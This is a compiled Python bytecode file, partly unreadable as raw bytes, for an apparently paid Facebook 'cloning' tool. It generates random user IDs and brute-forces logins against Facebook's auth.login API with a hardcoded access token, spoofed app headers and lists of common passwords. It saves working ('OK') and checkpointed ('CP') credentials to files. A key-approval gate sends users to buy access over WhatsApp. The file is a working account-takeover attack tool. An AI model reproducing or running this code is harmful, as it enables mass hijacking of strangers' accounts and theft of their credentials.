o
    ��b�B  �                   @   sb  d dl Z zd dlZW n ey   ed� e �d� Y nw zd dlZW n ey:   ed� e �d� e �d� Y nw d dl Z d dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlZd dlmZ d dlmZ d d	lmZ d
d� Zdd� Zdd� Zdd� Ze�� ZejZg d�Zzed k s�edkr�e�  ed ZW n ey�   e�  Y nw e�� ZejZejZ ej!Z"ee Z#e�$� Z%ej&e%�'�  Z(de(e"e#ef Z)de"e#ef Z*dddddddddd d!d"d#�Z+d$Z,d%d� Zd&d� ZG d'd(� d(�Z-e.ej/�d)k�rej/d d*k�red+� e�  ne-�  ze�  W dS  e0�y0 Z1 zee2e1�� W Y dZ1[1dS dZ1[1ww ),�    Nz5
 [!] [0;91mmodule requests belum terinstall [0;97mzpip install requestsz3
 [!] [0;91mmodule futures belum terinstall[0;97mzpip install futureszpkg install figlet)�ThreadPoolExecutor)�datetime)�datec               	   C   �&  t �d� tt� td� td� td� t�d� zd} t�| �}t|d��	� }W n t
tfy8   t�  Y nw zd}t�|�}t�|�j}W n tjjyZ   td� t�  Y nw ||v rdt�  d S t �d� tt� td	� t td
� t td| d � t td� t �d| � t�  d S )N�clear� �^
[1;92;1m Note: If Approval In Loading Or Show 
No Internet Connection,Then Connect USA Proxy�   �.   x��OI,I����z%�E���i�9�����E��%����̤b ����rs)   x��())(���/H,.IM���K���/J,�w-�1L ����[0;31mNo Internet Connection� [1;96m	Your Id Is Not Approved �Q   
[1;91m [[1;92m✓[1;91m][1;92m Do Not Press Enter If You Are A Free User[0m�5   
[1;91m [[1;92m✓[1;91m][1;92m Your Key : [101m�[0m�B   
[1;91m [[1;92m✓[1;91m][1;92m Press Enter To Buy This Tools ��am start https://wa.me/+8801645137393?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20Niki%20Paid%20Tools.%20My%20Key:%20��os�system�print�logo1�time�sleep�zlib�
decompress�open�read�KeyError�IOError�bnsreg�requests�get�text�
exceptions�ConnectionError�exit�Main�input�bnsbuy��f�bd�toZbtZbwr   � r.   �d09.pyr)      �D   



�

�


r)   c                  C   ��   t �d� tt� td� t td� tt�t�� d��dd � �� d } t td|  d � t t	d	� t �d
|  � d}t
�|�}t|d�}|�| � |��  t �d� t�d� tt� td|  d � t�  d S )Nr   �	[106mKey Not Approved [0m�J   
[1;91m [[1;92m✓[1;91m][1;92m Note : This Tools Is Paid,So Pay Firstr   �   z~NIKI==�9   
[1;91m [[1;92m✓[1;91m][1;92m Your Key: [92m[101mr   �A   
[1;91m [[1;92m✓[1;91m][1;92m Press Enter To Buy This Toolsr   r
   �w�   �%[1;92mSent Your Key :[1;92m [1;92mzU[1;92m 
[1;92mTo Admin And Buy This Tools First 
 [1;92mThen Run This Tools Again �r   r   r   r   �str�uuidZuuid1Zgetnode�upperr(   r   r   r   �write�closer   r   �jalanr&   ��idr+   r,   Zsavr.   r.   r/   r    @   �*   
$





r    c                  C   sH   g d�} t d�D ]}| D ]}tj�d| � tj��  t�d� qqd S )N)�|�/�-�\�   z  [32mr	   )�range�sys�stdoutr>   �flushr   r   )�m�b�tr.   r.   r/   �sangarX   s   
��rP   c                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )N�
g���Q��?)rJ   rK   r>   rL   r   r   )�z�er.   r.   r/   r@   `   s
   
�r@   )�January�February�March�April�May�June�July�August�	September�October�November�December�   r	   z%s-%s-%s-%sz%s %s %srT   rU   rV   rW   rX   rY   rZ   r[   r\   r]   r^   r_   )�01�02�03�04�05Z06Z07Z08Z09Z10Z11Z12u�   
        [1;91m ██████╗░███████╗██╗░░░██╗██╗██╗░░░░░
        [1;91m ██╔══██╗██╔════╝██║░░░██║██║██║░░░░░
        [1;91m ██║░░██║█████╗░░╚██╗░██╔╝██║██║░░░░░
        [1;91m ██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░
        [1;91m ██████╔╝███████╗░░╚██╔╝░░██║███████╗
        [1;91m ╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝
        c               	   C   r   )Nr   r   r   r	   �/   x��OI,I����z%�E���i�9�����E��%���%�y� [[r   sJ   x��())(���/J,�K�,�(M*-N-J��+I�+�K����-�uI-���500�w,((�/K���M��ӷ�+�( 6��r   r   r   r   r   r   ��am start https://wa.me/+8801875529351?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%202004-2005%20Paid%20Tools.%20My%20Key:%20r   r*   r.   r.   r/   r)   �   r0   c                  C   r1   )Nr   r2   r3   r   r4   z~DEVIL==r5   r   r6   rg   rf   r7   r8   r9   zo[1;92m 
[1;92mTo Admin And Buy This Tools First 
 [1;92mThen Run This Tools With [1;93m python N-Crack-Pro r:   rA   r.   r.   r/   r    �   rC   c                   @   s$   e Zd Zdd� Zdd� Zdd� ZdS )r'   c                 C   s^  g | _ g | _g | _d| _t�d� t�d� td� td� td� td� td� td	� td
� td� td� td� td� td� td� td� td�}|dv r[t�  d S |dv re| �	�  d S |dv rst�d� t
�  d S |dv r�t�d� t
�  d S |dv r�t�d� t
�  d S |dv r�t�d� d S |dv r�t�d� t�d� d S t�  d S ) Nr   r   z>xdg-open  https://youtube.com/channel/UCoCVfFSoXWVF6_lIPUSMu1w�t   [1;91m ██████╗░███████╗██╗░░░██╗██╗██╗░░░░░�t   [1;91m ██╔══██╗██╔════╝██║░░░██║██║██║░░░░░�t   [1;91m ██║░░██║█████╗░░╚██╗░██╔╝██║██║░░░░░�t   [1;91m ██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░�t   [1;91m ██████╔╝███████╗░░╚██╔╝░░██║███████╗�t   [1;91m ╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝z6[1;92m_______________________________________________zS
[1;92m [[1;91m1[1;92m][1;91m Start Crack Old[1;91m[[1;92m2009[1;91m][1;91mz6[1;92m [[1;91m2[1;92m][1;91m Follow My Facebook Idz8[1;92m [[1;91m3[1;92m][1;91m Follow My Facebook Pagez:[1;92m [[1;91m4[1;92m][1;91m Follow My Youtube Channelz1[1;92m [[1;91m5[1;92m][1;91m Follow My Githubz%[1;92m [[1;91m0[1;92m][1;92m Exit�6[1;91m_______________________________________________u4   
[1;91m [[1;92m✓[1;91m][1;91m CHOOSE : [1;91m)r   � )�1ra   )�2rb   z4xdg-open  https://www.facebook.com/King.Of.Mind.City)�3rc   z@xdg-open https://www.facebook.com/profile.php?id=100076685232895)�4rd   z=xdg-open https://youtube.com/channel/UCoCVfFSoXWVF6_lIPUSMu1w)�5re   z(xdg-open https://github.com/Mr-Devil-007)�0Z00r&   r8   )rB   �ok�cp�loopr   r   r   r(   r'   �niki�mainr   r   )�selfry   r.   r.   r/   �__init__�   sP   










zMain.__init__c              
   C   s�  d}d}d}t td��}z�t|�D ]}t�||�}|}| j�|t|� � qtdt	| j� � td� t
dd��j}td	� td
�}	t	|	�dkrKtd� td|	 � t�d� td� td� td� td� td� td� td� tdt � tdt � td� td� td� | jD ]}
|�| j|
|	�d�� q�W d   � n1 s�w   Y  td� W d S  ty� } ztt|�� W Y d }~d S d }~ww )Ni� i?B rq   uz   [1;91m [[1;92m✓[1;91m][1;91m Enter your ID Limit
[1;91m [[1;92m✓[1;91m][1;91m Example [5000] [1;91m-> [1;91muL   [1;91m [[1;92m✓[1;91m][1;91m TOTAL ID       [1;91m-> [1;91m%s[0;91mrn   �   )�max_workersu�   
[1;91m [[1;92m✓[1;91m][1;91m Use Comma <,> For Separator
[1;91m [[1;92m✓[1;91m][1;91m Password Minimum 6 Digits 
[1;91m [[1;92m✓[1;91m][1;91m Example  [1;91m->[1;91m 123456,1234567,112233,102030[0;91muC   [1;91m [[1;91m✓[1;91m][1;91m Enter Password [1;91m-> [1;91m�   uA   
[1;91m [[1;92m✓[1;91m][1;91m Password Minimum 6 CharactersuL   [1;91m [[1;92m✓[1;91m][1;91m Crack Password [1;91m-> [1;91m%s[0;91mr   rh   ri   rj   rk   rl   rm   uK   [1;91m [[1;92m✓[1;91m][1;92m OK Results Saved In [1;91m : [1;92mOK-uK   [1;91m [[1;92m✓[1;91m][1;91m CP Results Saved In [1;91m : [1;91mCP-uO   [1;91m [[1;92m✓[1;91m][1;91m If No Result, Turn On Airplane Mode 5 Secondu@   [1;91m [[1;92m✓[1;91m][1;91m Login CP Account After 7 Daysz7[1;91m_______________________________________________
�,u>   
[1;91m [[1;92m✓[1;91m][1;91m Your Clonnig Successful...)�intr(   rI   �random�randintrB   �appendr;   r   �lenr   r&   r   r   �tglZsubmit�api�split�	Exception)r{   �x�xx�idx�limit�n�_�__ZcoegZlistpass�userrS   r.   r.   r/   ry   �   sL   

��(� z	Main.nikic              
   C   s�  t �ddg�}tj�d| jt| j�t| j�t| j	�f � tj�
�  |D ]�}|�� }t�� }tt �dd��tt �dd��tt �dd��dd	|d
dd�}|jdt|� d t|� d |d�}d|jv r�d|jv r�td||f � | j�d||f � tdt d d��d||f �  q�d|�� d v r�td||f � | j	�d||f � tdt d d��d||f �  q�q$|  jd7  _d S )Na  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]a  Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011;]z7[1;91m[CRACK] %s/%s -> [1;92mOK:-%s - [1;91mCP:-%s g    ��>Ag    `�FAi N  i@�  Z	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPAz!application/x-www-form-urlencodedZLiger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typez
user-agentzcontent-typezx-fb-http-enginez?https://b-api.facebook.com/method/auth.login?format=json&email=z
&password=a�  &credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true)�headersZsession_keyZEAAAz% [1;92m[OK] %s | %s[0;91m         z%s | %szOK-z.txt�az%s | %s
zwww.facebook.comZ	error_msgz, [1;91m[CP][1;91m %s | %s[0;91m         zCP-r	   )r�   �choicerJ   rK   r>   rx   r�   rB   rv   rw   rL   �lowerr!   ZSessionr;   r�   r"   r#   r   r�   r   r�   Zjson)r{   �uidZpwxZuaZpwZsesr�   Zresponser.   r.   r/   r�     sB   �"�
�&
  zMain.apiN)�__name__�
__module__�__qualname__r|   ry   r�   r.   r.   r.   r/   r'   �   s    +%r'   rH   z--infou/    [•] GITHUB : https://github.com/Mr-Devil-007)3r   r!   �ImportErrorr   r   �concurrent.futuresZ
concurrentrJ   �base64r   r<   r   Zcalendarr�   r   r   r   r)   r    rP   r@   ZnowZctZmonthr�   Zbulanr&   ZnTemp�
ValueErrorZcurrentZyear�taZbuZdayZha�opZtodayZmy_dateZday_nameZweekday�hrZtanggalr�   Z	bulan_ttlr   r'   r�   �argvr�   rS   r;   r.   r.   r.   r/   �<module>   sz   �
�%
�	%w*� 